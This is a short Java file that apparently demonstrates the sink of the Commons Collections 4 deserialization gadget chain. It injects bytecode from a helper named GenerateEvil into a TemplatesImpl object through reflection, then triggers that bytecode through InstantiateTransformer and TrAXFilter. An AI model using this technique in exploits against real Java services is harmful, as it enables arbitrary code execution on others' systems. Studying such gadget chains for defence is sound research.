package com.example.cc4;

import com.example.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;

public class TransformerExec {
    public static void main(String[] args) throws Exception{
        byte[] code = Utils.GenerateEvil();
        TemplatesImpl obj = new TemplatesImpl();
        Utils.SetValue(obj, "_name","0w0");
        Utils.SetValue(obj, "_bytecodes", new byte[][]{code});
        Utils.SetValue(obj, "_tfactory", new TransformerFactoryImpl());

        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj});
        instantiateTransformer.transform(TrAXFilter.class);
    }
}
